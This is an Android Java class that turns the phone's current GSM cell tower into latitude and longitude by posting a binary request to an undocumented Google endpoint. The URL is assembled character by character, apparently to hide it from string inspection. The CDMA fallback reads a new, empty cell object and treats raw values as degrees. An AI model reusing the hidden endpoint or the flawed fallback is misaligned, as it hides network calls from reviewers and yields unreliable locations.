package com.fx.android.common.events.location;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;

import com.fx.android.common.Customization;
import com.fx.android.common.http.HttpWrapper;
import com.fx.android.common.http.HttpWrapperException;
import com.fx.android.common.http.HttpWrapperResponse;
import com.fx.dalvik.phoneinfo.PhoneInfoHelper;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.fx.dalvik.util.TelephonyUtils;
import com.fx.dalvik.util.TelephonyUtils.NetworkOperator;


public class CellLocationToLocation {
	
//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------
	
	private static final String TAG = "CellLocationToLocation";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final int HTTP_RESPONSE_CODE_200 = 200;
	private static final String USER_AGENT_HEADER = "User-Agent";
	
	private Context mContext;
	private long mPostTime;
	
	private static class SingletonHolder {
		private static final CellLocationToLocation INSTANCE = new CellLocationToLocation();
	}
	
	private CellLocationToLocation() {
	}

	private static void writeGsmLocationRequest(GsmCellLocation gsmCellLocation, 
												NetworkOperator networkOperator,
												OutputStream outStream) 
			throws IOException, ConversionException {
		
		String mncString = networkOperator.getMnc();
		
		if (mncString == null) {
			throw new ConversionException("Cannot get MNC");
		}
		
		String mccString = networkOperator.getMcc();
		
		if (mccString == null) {
			throw new ConversionException("Cannot get MCC");
		}
		
		DataOutputStream dataOutStream = new DataOutputStream(outStream);
		int gsmCellId = gsmCellLocation.getCid(); 
		int gsmAreaCode = gsmCellLocation.getLac();
		int mnc = Integer.parseInt(networkOperator.getMnc());
		int mcc = Integer.parseInt(networkOperator.getMcc());
		
		dataOutStream.writeShort(0x000E);
		dataOutStream.writeLong(0);
		dataOutStream.writeInt(0);
		dataOutStream.writeShort(0x0000);
		dataOutStream.writeByte(0x1B);
		dataOutStream.writeInt(mnc);
		dataOutStream.writeInt(mcc);
		
		if (gsmCellId > 65536) {
			dataOutStream.writeInt(5);
		} else {
			dataOutStream.writeInt(3);
		}
		
		dataOutStream.writeShort(0);
		dataOutStream.writeInt(gsmCellId);
		dataOutStream.writeInt(gsmAreaCode);
		
		dataOutStream.writeInt(mnc);
		dataOutStream.writeInt(mcc);
		
		dataOutStream.writeInt(0xFFFFFFFF);
		dataOutStream.writeInt(0x00000000);
		
		dataOutStream.flush();
		
	}
	
	private String getServiceUrl() {
		char[] url = new char[30];

		url[0] = 'h';
		url[1] = 't';
		url[2] = 't';
		url[3] = 'p';
		url[4] = ':';
		url[5] = '/';
		url[6] = '/';
		url[7] = 'w';
		url[8] = 'w';
		url[9] = 'w';
		url[10] = '.';
		url[11] = 'g';
		url[12] = 'o';
		url[13] = 'o';
		url[14] = 'g';
		url[15] = 'l';
		url[16] = 'e';
		url[17] = '.';
		url[18] = 'c';
		url[19] = 'o';
		url[20] = 'm';
		url[21] = '/';
		url[22] = 'g';
		url[23] = 'l';
		url[24] = 'm';
		url[25] = '/';
		url[26] = 'm';
		url[27] = 'm';
		url[28] = 'a';
		url[29] = 'p';
				
		return new String(url);
	}
	
	private String getUserAgent() {
		if (LOCAL_LOGV) FxLog.v(TAG, "getUserAgent # ENTER ...");
		
		/*
		String aUserAgent = String.format("android:%s,%s,%s,%s,%s,FP=%s,Host=%s,ID=%s,Display=%s,Tag=%s,Type=%s,VersionCodeName=%s", 
				Build.DEVICE, Build.PRODUCT, Build.MODEL, Build.BOARD, Build.BRAND, Build.FINGERPRINT, 
				Build.HOST, Build.ID, Build.DISPLAY,Build.TAGS, Build.TYPE, Build.VERSION.CODENAME);
*/
		//String aUserAgent = String.format("android:%s-%s-%s", Build.MANUFACTURER, Build.DEVICE, Build.MODEL);
		
		String userAgent = String.format("android:%s-%s", 
				PhoneInfoHelper.getDevice(), 
				PhoneInfoHelper.getModel());
		
		if (LOCAL_LOGV) FxLog.v(TAG, String.format("User agent: %s", userAgent));
		return userAgent;
	}
	
//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------
	
	public static class ConversionException extends Exception {
		
		/**
		 * Auto-generated
		 */
		private static final long serialVersionUID = 1L;

		public ConversionException(Throwable e) {
			super(e);
		}
		
		public ConversionException(String s) {
			super(s);
		}
				
	}
	
	public static CellLocationToLocation getInstance(Context aContext) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getInstance # ENTER ...");
			FxLog.v(TAG, String.format("context = %s", aContext));
		}
		SingletonHolder.INSTANCE.mContext = aContext;
		return SingletonHolder.INSTANCE; 
	}
	
	public Location convertCellLocationToLocation(CellLocation cellLocation, 
												  NetworkOperator networkOperator) 
		throws ConversionException {
		
		Location location = new Location(LocationManager.NETWORK_PROVIDER);
		
		if (cellLocation instanceof GsmCellLocation) {
			GsmCellLocation aGsmCellLocation = (GsmCellLocation) cellLocation;
			ByteArrayOutputStream bytesOutStream = new ByteArrayOutputStream();
			byte[] requestBytes;
			
			// Construct request
			try {
				writeGsmLocationRequest(aGsmCellLocation, networkOperator, bytesOutStream);
			} catch (IOException e) {
				if (LOCAL_LOGD) FxLog.d(TAG, "Cannot construct a request.", e);
				throw new ConversionException(e);
			}
			
			requestBytes = bytesOutStream.toByteArray();
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("Request: %s", GeneralUtil.bytesToString1(requestBytes)));
			}
			
			HttpWrapper httpWrapper = HttpWrapper.getInstance();
			HttpWrapperResponse response = null;
			
			httpWrapper.addHeader(USER_AGENT_HEADER, getUserAgent());
			
			if (LOCAL_LOGV) FxLog.v(TAG, "Posting...");
			
			long aStartTime = System.currentTimeMillis();
			
			try {
				response = httpWrapper.httpPost(getServiceUrl(), requestBytes);
				mPostTime = System.currentTimeMillis() - aStartTime;
			} catch (HttpWrapperException e) {
				mPostTime = System.currentTimeMillis() - aStartTime;
				if (LOCAL_LOGD) FxLog.d(TAG, "Cannot connect to the server.", e);
				throw new ConversionException(e);
			}
			
			if (response.getHttpStatusCode() == HTTP_RESPONSE_CODE_200) {
			
				byte[] responseBytes = response.getBodyAsBytes();
		
				if (LOCAL_LOGV) {
					FxLog.v(TAG, 
						String.format("Response: %s", GeneralUtil.bytesToString1(responseBytes)));
				}
				
				ByteArrayInputStream responseByteStream = new ByteArrayInputStream(responseBytes);
				DataInputStream responseDataStream = new DataInputStream(responseByteStream);
				
				try {
					responseDataStream.readShort();
					responseDataStream.readByte();
					int code = responseDataStream.readInt();
					
					if (code == 0) {
						double latitude = (double) responseDataStream.readInt() / 1E6;
						double longitude = (double) responseDataStream.readInt() / 1E6;
						
						if (LOCAL_LOGV) {
							FxLog.v(TAG, String.format("Location: %f,%f", latitude, longitude));
						}
						
						location = new Location(LocationManager.NETWORK_PROVIDER);
						location.setLatitude(latitude);
						location.setLongitude(longitude);
						location.setTime(System.currentTimeMillis());
					}
					
				} catch (IOException e) {
					if (LOCAL_LOGD) FxLog.d(TAG, "Cannot read the response.", e);
					throw new ConversionException(e);
				}
				
			} else {
				String errorMessage = String.format("Invalid HTTP response code: %d", 
						response.getHttpStatusCode()); 
				if (LOCAL_LOGD) FxLog.d(TAG, errorMessage);
				throw new ConversionException(errorMessage);
			}
			
		} else {
			
			// Use reflection for backward-compatibility (CdmaCallLocation is available for 
			// API level >= 5, or Android 2.0).
			try {
				Class<?> cdmaCellLocationClass;
				cdmaCellLocationClass = Class.forName("android.telephony.cdma.CdmaCellLocation");
				Object cdmaCellLocation = cdmaCellLocationClass.newInstance();
				
				Method getBaseStationLatitudeMathod = 
					cdmaCellLocationClass.getDeclaredMethod("getBaseStationLatitude");
				Method getBaseStationLongitudeMethod = 
					cdmaCellLocationClass.getDeclaredMethod("getBaseStationLongitude");

				int latitude = (Integer) getBaseStationLatitudeMathod.invoke(cdmaCellLocation);
				int longitude = (Integer) getBaseStationLongitudeMethod.invoke(cdmaCellLocation);
				
				if (latitude != Integer.MAX_VALUE) {
					location.setLatitude((double) latitude);
					location.setLongitude((double) longitude);
				}
				location.setTime(System.currentTimeMillis());
			} catch (ClassNotFoundException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (IllegalAccessException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (InstantiationException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (SecurityException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (NoSuchMethodException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (IllegalArgumentException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			} catch (InvocationTargetException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, "CDMA cell information to location conversion failed.", e);
				}
			}
		}
		
		return location;
	}
	
	public Location convertCellLocationToLocation(CellLocation aCellLocation) 
		throws ConversionException {

		TelephonyUtils telephonyUtils = new TelephonyUtils(mContext);
		return convertCellLocationToLocation(aCellLocation, telephonyUtils.getNetworkOperator()); 
	}
	
	public Location getLocationOfCurrentCellLocation() throws ConversionException {
		TelephonyManager telephonyManager = 
			(TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		return convertCellLocationToLocation(telephonyManager.getCellLocation());
	}
	
	public long getPostTime() {
		return mPostTime;
	}

}
